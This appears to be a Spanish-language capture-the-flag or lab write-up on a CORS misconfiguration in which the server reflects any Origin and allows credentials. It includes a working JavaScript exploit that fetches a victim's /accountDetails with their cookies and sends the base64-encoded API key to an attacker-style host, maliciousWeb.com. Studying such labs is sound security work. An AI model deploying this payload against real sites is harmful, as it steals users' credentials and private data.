# CORS con reflexión básica del origen

Tags: #CORS 

```bash 
CORS (Cross Origin Resource Sharing): Es un mecanismo de seguridad que aplican los navegadores cuando se esta haciendo una petición a un recurso que está alojado en otro origen. Si el recurso está alojado en otro origen, el navegador automáticamente comprobará las cabeceras HTTP buscando una autorización expresa por parte del servidor.


- Access-Control-Allow-Credentials 'True': Permite que el navegador envíe cookies, tokens de sesión u otros datos de autenticación en la solicitud

- Origin: Indica el origen de la solicitud, específicamente el servidor desde donde se originó, sin incluir la ruta. Es crucial para las solicitudes de origen cruzado (CORS) y ayuda a los navegadores a aplicar políticas de seguridad como la política del mismo origen

- Access-Control-Allow-Origin: En este lab esta cabecera apararecerá con cualquier origen porque esta mal configurado el CORS
```

```bash 
El lab plantea un escenario en el que un endpoint sensible (/accountDetails) devuelve información privada —como la clave API del usuario— y permite solicitudes de origen cruzado reflejando el valor de la cabecera Origin. Esto significa que el serv
idor confía ciegamente en cualquier origen que le envíe una solicitud, siempre y cuando también devuelva la cabecera Access-Control-Allow-Credentials: true, lo que permite el envío de cookies junto con la petición.
```

```javascript 
// La politica de CORS no esta bien definida por lo que permite cualquier origen y por lo tanto permite intercambiar información hacía un servidor de atacante 

<script>
	var req = new XMLHttpRequest();
	req.onload = function() {
		location = "https://maliciousWeb.com/?apiKey=" + btoa(req.responseText);   // Forzar a la víctima a que tramite una solicitud por GET al servidor de atacante para que envie el contenido de la respuesta en base64
	};
	req.open("GET", "https://web.com/accountDetails", true);
	req.withCredentials = true;    // Arrastrar la cookie de sesión de la víctima 
	req.send();
</script>


Notas:
	1. Necesitas una sesión activa de la víctima que visita la página maliciosa 
	2. req.open(true) = Asíncrona para que no continue el flujo hasta que no se tenga la respuesta 
```

```bash 
❯ echo -n 'base64Code' |  base64 -d | jq 

	# base64 -d = Decodear el código que se encuentra en base64 
	# jq = Procesar la data en Json 
```